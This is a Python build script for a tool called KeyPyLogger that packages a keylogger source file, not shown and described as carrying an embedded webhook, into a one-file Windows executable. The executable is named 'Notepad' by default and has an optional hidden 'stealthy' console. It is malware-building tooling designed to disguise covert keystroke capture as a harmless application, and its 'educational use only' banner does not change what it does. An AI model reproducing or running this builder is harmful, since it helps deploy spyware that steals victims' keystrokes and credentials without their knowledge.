#!/usr/bin/env python3
"""
Direct compiler - No placeholders, just compile keylogger_with_args.py
"""

import sys
import subprocess
from pathlib import Path
import shutil

def compile_keylogger(output_name="Notepad", show_console=False):
    """Compile the keylogger with embedded webhook"""

    print("=" * 70)
    print("KeyPyLogger - Direct Compiler")
    print("=" * 70)

    base_dir = Path(__file__).parent
    source_file = base_dir / "keylogger_with_args.py"
    output_dir = base_dir / "build" / "dist"
    build_temp = base_dir / "build" / "build_temp"
    spec_dir = base_dir / "build"

    # Create directories
    output_dir.mkdir(parents=True, exist_ok=True)

    # Verify source exists
    if not source_file.exists():
        print(f"[!] ERROR: Source file not found: {source_file}")
        return False

    print(f"\n[*] Source: {source_file}")
    print(f"[*] Output: {output_dir / (output_name + '.exe')}")
    print(f"[*] Console: {'Visible' if show_console else 'Hidden'}")
    print("\n[*] Compiling with PyInstaller...")
    print("    This may take a few minutes...\n")

    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--console' if show_console else '--noconsole',
        '--name', output_name,
        '--distpath', str(output_dir),
        '--workpath', str(build_temp),
        '--specpath', str(spec_dir),
        '--clean',
        '-y',
        str(source_file)
    ]

    try:
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)

        # Cleanup
        if build_temp.exists():
            shutil.rmtree(build_temp, ignore_errors=True)

        exe_path = output_dir / (output_name + '.exe')

        if not exe_path.exists():
            print(f"[!] ERROR: Executable not found!")
            return False

        print("\n" + "=" * 70)
        print("✓ COMPILATION SUCCESSFUL!")
        print("=" * 70)
        print(f"\nExecutable: {exe_path}")
        print(f"Size: {exe_path.stat().st_size / 1024 / 1024:.2f} MB")
        print("\n" + "=" * 70)
        print("⚠️  LEGAL WARNING - EDUCATIONAL USE ONLY")
        print("=" * 70)
        print("Only use on systems you own or have explicit permission to test!")
        print("=" * 70)

        return True

    except subprocess.CalledProcessError as e:
        print(f"\n[!] Compilation FAILED!")
        print(f"Error: {e.stderr}")
        return False
    except Exception as e:
        print(f"\n[!] ERROR: {e}")
        return False


if __name__ == "__main__":
    print("\nOptions:")
    print("1. Hidden console (stealthy)")
    print("2. Visible console (for debugging)")

    choice = input("\nChoice (1 or 2): ").strip()
    show_console = choice == "2"

    output_name = input("Output name (default: Notepad): ").strip()
    if not output_name:
        output_name = "Notepad"

    compile_keylogger(output_name, show_console)
